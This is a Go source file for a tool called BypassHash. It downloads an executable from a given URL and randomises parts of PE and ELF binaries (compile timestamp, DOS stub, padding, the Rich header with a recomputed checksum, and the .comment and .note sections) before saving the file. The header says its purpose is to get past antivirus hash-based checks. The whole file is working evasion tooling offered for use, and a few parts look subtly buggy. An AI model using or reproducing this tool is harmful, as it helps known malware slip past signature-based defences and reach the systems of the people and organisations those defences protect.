/*
    This tool downloads an executable and bypass hash-based virus checks
    Copyright (C) 2022, 2024  Maurice Lambert

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// set CGO_ENABLED=0
// set GOARCH=amd64
// set GOOS=linux
// go build -trimpath -a -gcflags=all="-l -B" -ldflags="-s -w" -o BypassHash BypassHash.go
// set GOOS=windows
// go build -trimpath -a -gcflags=all="-l -B" -ldflags="-s -w" -o BypassHash.exe BypassHash.go

// This project downloads an executable/compiled
// file and modifies its contents before writing
// it to disk to bypass antivirus hash checks.

package main

import (
    "encoding/binary"
//    "crypto/md5"
    "math/rand"
    "net/http"
    "strings"
    "bytes"
    "time"
    "fmt"
    "os"
    "io"
)

// ELF64 Header structure
type ELF64Header struct {
    Ident     [16]byte
    Type      uint16
    Machine   uint16
    Version   uint32
    Entry     uint64
    PhOff     uint64
    ShOff     uint64
    Flags     uint32
    EhSize    uint16
    PhEntSize uint16
    PhNum     uint16
    ShEntSize uint16
    ShNum     uint16
    ShStrNdx  uint16
}

// ELF64 Section Header structure
type ELF64SectionHeader struct {
    Name      uint32
    Type      uint32
    Flags     uint64
    Addr      uint64
    Offset    uint64
    Size      uint64
    Link      uint32
    Info      uint32
    AddrAlign uint64
    EntSize   uint64
}

type NoteHeader struct {
    Namesz uint32
    Descsz uint32
    Type   uint32
}

type CompleteNote struct {
    name_size uint64
    description_size uint64
    note_type uint32
    name string
    description []byte
    name_position uint64
    description_position uint64
}

type PeFields struct {
    machine uint16
    optional_header_offset uint32
    data_directory_offset uint32
    address_size uint32
    import_table_rva uint32
    section_headers_offset uint32
    number_of_sections uint16
    import_table_file_offset uint32
}

type RichHeaders struct {
    checksum []byte
    checksum_value uint32
    position int
    start int
    end int
    headers []byte
    ids []uint64
}


// The "main" function to check command line arguments, run the scrip and exit
func main() {
    fmt.Println(`
BypassHash  Copyright (C) 2022, 2024  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
`)

    if len(os.Args) != 3 {
        fmt.Println("USAGES: BypassHash <url> <filename>")
        os.Exit(1)
    }

    url := os.Args[1]
    filename := os.Args[2]
    data := download(url)
    magic, pe_header_position := check_magic_bytes(data)
    rich := check_rich_headers(pe_header_position, data)
    random_compiled_datetime(pe_header_position, data)
    random_padding(magic, data)
    random_ELF_content(magic, data)
    random_PE_content(pe_header_position, data)
    random_rich(rich, data)

    err := os.WriteFile(filename, data, 0644)
    if err != nil {
        panic(err)
    }

    os.Exit(0)
}

// This function modify PE specific content
func random_PE_content (pe_header uint, data []byte) {
    if pe_header == 0 {
        fmt.Println("No PE header")
        return
    }

    pe_fields := parse_PE_content(pe_header, data)
    get_import_table_offset(data, &pe_fields)
    // random_import_table(data, &pe_fields)
    random_DOS_Stub(pe_header, data)
}

// This function parses PE format and returns an object with important fields
func parse_PE_content (pe_header uint, data []byte) PeFields {
    var pe_fields PeFields

    pe_fields.machine = binary.LittleEndian.Uint16(data[pe_header + 4:])
    pe_fields.optional_header_offset = uint32(pe_header + 24)

    switch pe_fields.machine {
    case 0x014c:
        pe_fields.data_directory_offset = pe_fields.optional_header_offset + 96
        pe_fields.address_size = 4
    case 0x8664:
        pe_fields.address_size = 8
        pe_fields.data_directory_offset = pe_fields.optional_header_offset + 112
    default:
        fmt.Fprintf(os.Stderr, "Unknown machine type: 0x%x\n", pe_fields.machine)
        return pe_fields
    }

    pe_fields.import_table_rva = binary.LittleEndian.Uint32(data[pe_fields.data_directory_offset + 8:])
    pe_fields.section_headers_offset = pe_fields.optional_header_offset + uint32(binary.LittleEndian.Uint16(data[pe_header + 20:]))
    pe_fields.number_of_sections = binary.LittleEndian.Uint16(data[pe_header + 6:])

    return pe_fields
}

// This function parses PE sections to returns the import table file offset
func get_import_table_offset (data []byte, pe_fields *PeFields) {
    for i := uint16(0); i < pe_fields.number_of_sections; i++ {
        section_offset := pe_fields.section_headers_offset + uint32(i * 40)
        virtual_address := binary.LittleEndian.Uint32(data[section_offset + 12:])
        size_of_raw_data := binary.LittleEndian.Uint32(data[section_offset + 16:])
        pointer_to_raw_data := binary.LittleEndian.Uint32(data[section_offset + 20:])

        if pe_fields.import_table_rva >= virtual_address && pe_fields.import_table_rva < (virtual_address + size_of_raw_data) {
            pe_fields.import_table_file_offset = pointer_to_raw_data + (pe_fields.import_table_rva - virtual_address)
            break
        }
    }
}

// This function modify import table
func random_import_table (data []byte, pe_fields *PeFields) {
    import_offset := pe_fields.import_table_file_offset
    for {
        if bytes.Equal(data[import_offset:import_offset + 20], []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}) {
            break
        }

        bytes_fields := make([]byte, 8)
        max := time.Now().Unix()
        sec := rand.Uint32() % uint32(max)
        random_value := rand.Uint32()
        binary.LittleEndian.PutUint32(bytes_fields[4:], sec)
        binary.LittleEndian.PutUint32(bytes_fields, random_value)

        for i := uint32(0); i < 8; i += 1 {
            data[import_offset + 4 + i] = bytes_fields[i]
        }

        import_offset += 20
    }
}

// This function modify the DOS Stub
func random_DOS_Stub (pe_header uint, data []byte) {
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#%^&*()-_=+[]{}|;:,.<>?"
    random := make([]byte, 39)

    for i := range random {
        random[i] = charset[rand.Intn(87)]
    }

    new_data := bytes.Replace(data[0x40:pe_header], []byte("This program cannot be run in DOS mode."), random, -1)

    for i, charactere := range new_data {
        data[0x40 + i] = charactere
    }
}

// This function returns Rich headers position and checksum
func get_rich_headers (pe_header uint, data []byte) *RichHeaders {
    var rich *RichHeaders = &RichHeaders{}

    rich_headers := data[:pe_header]
    test := bytes.Index(rich_headers, []byte("Rich"))
    rich.position = test

    if rich.position == -1 {
        return rich
    }

    checksum_position := rich.position + 4
    rich.end = checksum_position + 4
    rich.checksum = data[checksum_position:rich.end]
    rich.checksum_value = binary.LittleEndian.Uint32(rich.checksum)

    rich_headers = data[:rich.end]

    marker := []byte{0x00, 0x00, 0x00, 0x00}
    plain_marker := []byte("DanS")

    for i, char := range rich.checksum {
        marker[i] = char ^ plain_marker[i]
    }

    rich.start = bytes.Index(rich_headers, marker)
    if rich.start == -1 {
        return rich
    }

    rich.headers = data[rich.start:rich.end]
    return rich
}

// This function generates the Rich checksum
func check_rich_headers (pe_header uint, data []byte) *RichHeaders {
    rich := get_rich_headers(pe_header, data)

    if rich.position == -1 || rich.start == -1 {
        return rich
    }

    for i := 16; i < rich.position - rich.start; i += 8 {
        product_id := binary.LittleEndian.Uint32(rich.headers[i:i + 4]) ^ rich.checksum_value
        build_id := binary.LittleEndian.Uint32(rich.headers[i + 4:i + 8]) ^ rich.checksum_value
        rich.ids = append(rich.ids, (uint64(build_id) << 32) | uint64(product_id))
    }

    calcul_checksum := calcul_rich_headers(rich, data)
    if calcul_checksum != rich.checksum_value {
        fmt.Fprintf(os.Stderr, "Invalid Rich headers checksum %i %i\n", calcul_checksum, rich.checksum_value)
    }

    return rich
}

/*
https://raw.githubusercontent.com/dishather/richprint/master/comp_id.txt

Most common products ID:
0104
0105
0102
0100
0101
0108
0109
010b
010c
0106
0107
010a
010d
010e

Most common builds ID:
854b
8548
8415
8414
8413
82f3
82f2
82f0
816f
816e
816d
816a
8039
8038
8036
7f19
7f17
7f16
7f14
7dd9
7dd8
7dd7
7cc6
7cc1
7cbf
7b8e
7a64
7a61
8680
867f
867e
8611
85b2
8547
8545
84e5
8483
846d
8410
840f
83b9
8351
82f1
82ef
8294
8229
81c2
8169
8168
8166
8106
8097
8034
7fc1
7f12
7f0a
7ef6
7e43
7dd5
7d7c
7d13
7cbd
7cbc
7cbb
7cb1
7c4f
7be9
7b8d
7b8c
7b8b
7b1d
7ac0
7a60
7a5e
7a46
798a
7980
797f
78c7
7862
77f1
77f0
7740
76d7
76c1
75cc
75ca
75c9
75c8
75c7
75c4
75c3
75c2
75c1
75c0
75bf
75be
75bd
75bc
75bb
75ba
75b9
75b8
75b5
7558
7556
7555
74db
74da
74d9
74d6
7299
7298
7297
7296
7295
71b8
71b7
71b6
7086
7085
6fc6
6fc4
6fc3
6fc2
6e9f
6e9c
6e9b
6e9a
6dc9
6d01
6c36
6b74
6996
6993
6992
6991
698f
686c
686a
6869
6866
6741
673f
673e
673d
673c
6614
6613
6611
6610
64eb
64ea
64e7
63cb
63c6
63a3
63a2
61b9
5e97
5e92
5d6e
5bd2
59f2
*/

// This function calcul rich headers
func calcul_rich_headers (rich *RichHeaders, data []byte) uint32 {
    calcul_checksum := uint32(rich.start)
    for i, char := range data[:rich.start] {
        if i >= 60 && i < 64 {
            continue
        }
        shift_left := uint32(char) << uint(i % 32)
        shift_right := uint32(char) >> uint(32 - (i % 32))
        calcul_checksum += (shift_left | (shift_right & 255))
        calcul_checksum &= 4294967295
    }

    for _, id := range rich.ids {
        product_build_id := uint32(id & 0xffffffff)
        usage_number := uint32(id >> 32)
        shift_left := product_build_id << (usage_number % 32)
        shift_right := product_build_id >> (32 - (usage_number % 32))
        calcul_checksum += shift_left | shift_right
        calcul_checksum &= 0xffffffff
    }

    return calcul_checksum
}

// This function modify rich headers
func random_rich (rich *RichHeaders, data []byte) {
    if rich.position == -1 {
        return
    }

    if rich.start == -1 {
        binary.LittleEndian.PutUint32(rich.checksum, rand.Uint32())
        for i := 0; i < 4; i += 1 {
            data[rich.position + 4 + i] = rich.checksum[i]
        }
        return
    }

    products_id := []int{0x0104, 0x0105, 0x0102, 0x0100, 0x0101, 0x0108, 0x0109, 0x010b, 0x010c, 0x0106, 0x0107, 0x010a, 0x010d, 0x010e}
    builds_id := []int{0x854b, 0x8548, 0x8415, 0x8414, 0x8413, 0x82f3, 0x82f2, 0x82f0, 0x816f, 0x816e, 0x816d, 0x816a, 0x8039, 0x8038, 0x8036, 0x7f19, 0x7f17, 0x7f16, 0x7f14, 0x7dd9, 0x7dd8, 0x7dd7, 0x7cc6, 0x7cc1, 0x7cbf, 0x7b8e, 0x7a64, 0x7a61, 0x8680, 0x867f, 0x867e, 0x8611, 0x85b2, 0x8547, 0x8545, 0x84e5, 0x8483, 0x846d, 0x8410, 0x840f, 0x83b9, 0x8351, 0x82f1, 0x82ef, 0x8294, 0x8229, 0x81c2, 0x8169, 0x8168, 0x8166, 0x8106, 0x8097, 0x8034, 0x7fc1, 0x7f12, 0x7f0a, 0x7ef6, 0x7e43, 0x7dd5, 0x7d7c, 0x7d13, 0x7cbd, 0x7cbc, 0x7cbb, 0x7cb1, 0x7c4f, 0x7be9, 0x7b8d, 0x7b8c, 0x7b8b, 0x7b1d, 0x7ac0, 0x7a60, 0x7a5e, 0x7a46, 0x798a, 0x7980, 0x797f, 0x78c7, 0x7862, 0x77f1, 0x77f0, 0x7740, 0x76d7, 0x76c1, 0x75cc, 0x75ca, 0x75c9, 0x75c8, 0x75c7, 0x75c4, 0x75c3, 0x75c2, 0x75c1, 0x75c0, 0x75bf, 0x75be, 0x75bd, 0x75bc, 0x75bb, 0x75ba, 0x75b9, 0x75b8, 0x75b5, 0x7558, 0x7556, 0x7555, 0x74db, 0x74da, 0x74d9, 0x74d6, 0x7299, 0x7298, 0x7297, 0x7296, 0x7295, 0x71b8, 0x71b7, 0x71b6, 0x7086, 0x7085, 0x6fc6, 0x6fc4, 0x6fc3, 0x6fc2, 0x6e9f, 0x6e9c, 0x6e9b, 0x6e9a, 0x6dc9, 0x6d01, 0x6c36, 0x6b74, 0x6996, 0x6993, 0x6992, 0x6991, 0x698f, 0x686c, 0x686a, 0x6869, 0x6866, 0x6741, 0x673f, 0x673e, 0x673d, 0x673c, 0x6614, 0x6613, 0x6611, 0x6610, 0x64eb, 0x64ea, 0x64e7, 0x63cb, 0x63c6, 0x63a3, 0x63a2, 0x61b9, 0x5e97, 0x5e92, 0x5d6e, 0x5bd2, 0x59f2}

    for i, _ := range rich.ids {
        index := rand.Intn(len(products_id))
        product_id := products_id[index]
        index = rand.Intn(len(builds_id))
        build_id := builds_id[index]

        rich.ids[i] = (uint64(rand.Intn(255)) << 32) | (uint64(product_id) << 16) | uint64(build_id)
    }

    rich.checksum_value = calcul_rich_headers(rich, data)
    binary.LittleEndian.PutUint32(rich.checksum, rich.checksum_value)
    write_rich(rich, data)
}

// This function writes rich headers
func write_rich (rich *RichHeaders, data []byte) {
    plain_marker := []byte("DanS")

    for i, char := range rich.checksum {
        data[rich.start + i] = char ^ plain_marker[i]
    }

    for i := 1; i < 4; i++ {
        binary.LittleEndian.PutUint32(plain_marker, rand.Uint32())
        for j := 0; j < 4; j++ {
            data[rich.start + 4 * i + j] = plain_marker[j]
        }
    }

    double_checksum := (uint64(rich.checksum_value) << 32) | uint64(rich.checksum_value)
    temp_bytes_uint64 := []byte{0, 0, 0, 0, 0, 0, 0, 0, 0}

    for i, id := range rich.ids {
        id ^= double_checksum
        binary.LittleEndian.PutUint64(temp_bytes_uint64, id)
        for j := 0; j < 8; j++ {
            data[rich.start + 16 + 8 * i + j] = temp_bytes_uint64[j]
        }
    }

    for i, char := range rich.checksum {
        data[rich.end - 4 + i] = char
    }
}

// This function modify ELF specific content
func random_ELF_content (magic uint, data []byte) {
    if magic != 0x7F454C46 {
        fmt.Println("No ELF header")
        return
    }

    file := bytes.NewReader(data)
    elf_header, error_code := get_ELF_header(file)
    if error_code != 0 {
        return
    }

    section_headers, error_code := get_ELF_section_headers(file, elf_header)
    if error_code != 0 {
        return
    }

    string_table := get_string_table(data, elf_header, section_headers)
    random_comment(data, section_headers, string_table)
    random_notes(data, section_headers, string_table)
}

// This function returns the ELF header
func get_ELF_header (file *bytes.Reader) (ELF64Header, uint) {
    var header ELF64Header
    err := binary.Read(file, binary.LittleEndian, &header)
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error reading ELF header: %v", err)
        return header, 1
    }
    return header, 0
}

// This function returns the ELF sections headers
func get_ELF_section_headers (file *bytes.Reader, header ELF64Header) ([]ELF64SectionHeader, uint) {
    section_headers := make([]ELF64SectionHeader, header.ShNum)
    _, err := file.Seek(int64(header.ShOff), 0)
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error seeking to section header table: %v", err)
        return section_headers, 1
    }

    err = binary.Read(file, binary.LittleEndian, &section_headers)
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error reading section headers: %v", err)
        return section_headers, 2
    }

    return section_headers, 0
}

// This function returns the ELF string table
func get_string_table (data []byte, header ELF64Header, section_headers []ELF64SectionHeader) []byte {
    string_table_headers := section_headers[header.ShStrNdx]
    return data[string_table_headers.Offset:string_table_headers.Offset + string_table_headers.Size]
}

// This function filters sections when section name
// start with specific string
func filter_sections (section_headers []ELF64SectionHeader, string_table []byte, filter string) []*ELF64SectionHeader {
    var note_sections []*ELF64SectionHeader
    for i := range section_headers {
        if strings.HasPrefix(get_string(string_table, section_headers[i].Name), filter) {
            note_sections = append(note_sections, &section_headers[i])
        }
    }
    return note_sections
}

// This function returns random bytes
func get_random_bytes (size uint64) []byte {
    random_bytes := make([]byte, size)
    for i := range random_bytes {
        random_bytes[i] = byte(rand.Intn(256))
    }
    return random_bytes
}

// This function modify ELF .comment string
func random_comment (data []byte, section_headers []ELF64SectionHeader, string_table []byte) {
    for _, section := range filter_sections(section_headers, string_table, ".comment") {
        for i, new_byte := range get_random_bytes(section.Size - 1) {
            data[section.Offset + uint64(i)] = new_byte
        }
    }
}

// This function modify data for each ELF .note sections
func random_notes (data []byte, section_headers []ELF64SectionHeader, string_table []byte) {
    for _, section := range filter_sections(section_headers, string_table, ".note") {
        for _, note := range get_note_headers(data[section.Offset:section.Offset+section.Size], section.Offset) {
            random_note(data, note)
        }
    }
}

// This function modify .note data
func random_note (data []byte, note CompleteNote) {
    for i, new_byte := range get_random_bytes(note.name_size) {
        data[note.name_position + uint64(i)] = new_byte
    }
    for i, new_byte := range get_random_bytes(note.description_size) {
        data[note.name_position + uint64(i)] = new_byte
    }
}

// This function returns .note headers
func get_note_headers (section_content []byte, offset uint64) []CompleteNote {
    reader := bytes.NewReader(section_content)
    var notes []CompleteNote

    for reader.Len() > 0 {
        var header NoteHeader
        err := binary.Read(reader, binary.LittleEndian, &header)

        if err != nil {
            fmt.Fprintf(os.Stderr, "Error reading note headers: %v", err)
            return notes
        }

        var note CompleteNote
        note.note_type = header.Type

        note.name_position = uint64(get_position(reader)) + offset
        note.name = string(get_note_data(reader, header.Namesz))
        note.name_size = uint64(len(note.name))

        note.description_position = uint64(get_position(reader)) + offset
        note.description = get_note_data(reader, header.Descsz)
        note.description_size = uint64(len(note.description))

        notes = append(notes, note)
    }

    return notes
}

// This function returns position
func get_position (reader *bytes.Reader) int64 {
    position, err := reader.Seek(0, io.SeekCurrent)
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error getting note name position: %v", err)
    }
    return position
}

// This function returns .note data
func get_note_data (reader *bytes.Reader, size uint32) []byte {
    data_size := int(size + 3) & ^3
    data := make([]byte, data_size)
    _, err := reader.Read(data);
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error reading note data: %v", err)
    }
    return data
}

// This function get strings from data and start index
func get_string(string_table []byte, start uint32) string {
    end := bytes.IndexByte(string_table[start:], 0)
    if end == -1 {
        return ""
    }
    return string(string_table[start:start + uint32(end)])
}

// This function modify padding and unused fields (ELF and PE format)
func random_padding (magic uint, data []byte) {
    if magic != 0x50450000 {
        fmt.Println("No PE Header")
        random_padding := rand.Uint64() & 0x0000ffffffffffff
        bytes_padding := make([]byte, 8)
        binary.LittleEndian.PutUint64(bytes_padding, random_padding)

        for i := uint(2); i < 8; i += 1 {
            data[8 + i] = bytes_padding[i - 2]
        }

        return
    }

    bytes_padding := make([]byte, 32)

    for i := 0; i < 4; i += 1 {
        random_padding := rand.Uint64()
        binary.LittleEndian.PutUint64(bytes_padding[8 * i:], random_padding) 
    }

    for i := uint(0); i < 8; i += 1 {
        data[28 + i] = bytes_padding[i]
    }

    for i := uint(0); i < 20; i += 1 {
        data[0x28 + i] = bytes_padding[i + 8]
    }
}

// This function modify the compiled date time (available only for PE format)
func random_compiled_datetime (pe_header uint, data []byte) {
    if pe_header == 0 {
        fmt.Println("No random datetime")
        return
    }

    max := time.Now().Unix()
    sec := rand.Uint32() % uint32(max)
    bytes_timestamp := make([]byte, 4)

    binary.LittleEndian.PutUint32(bytes_timestamp, sec)

    for i := uint(0); i < 4; i += 1 {
        data[pe_header + 8 + i] = bytes_timestamp[i]
    }
}

// This function check the file format (ELF or MZ-PE)
func check_magic_bytes(data []byte) (uint, uint) {
    if bytes.Equal(data[:4], []byte{0x7F, 0x45, 0x4C, 0x46}) {
        return 0x7F454C46, 0
    }

    if bytes.Equal(data[:2], []byte{0x4D, 0x5A}) {
        index := binary.LittleEndian.Uint32(data[0x3C:0x40])
        if bytes.Equal(data[index:index+4], []byte{0x50, 0x45, 0x00, 0x00}) {
            return 0x50450000, uint(index)
        }
    }

    return 0, 0
}

// This function gets executable file content from URL
func download(url string) []byte {
    response, err := http.Get(url)
    
    if err != nil {panic(err)}
    defer response.Body.Close()

    if response.ContentLength <= 0 {
        fmt.Fprintln(os.Stderr, "Invalid content-length")
        os.Exit(2)
    }

    var buffer = make([]byte, response.ContentLength)
    last_index := 0

    for {
        time.Sleep(100 * time.Millisecond)
        last_index, err = response.Body.Read(buffer[last_index:])
        if err != nil {
            if err != io.EOF {panic(err)}
            break
        }
    }

    return buffer
}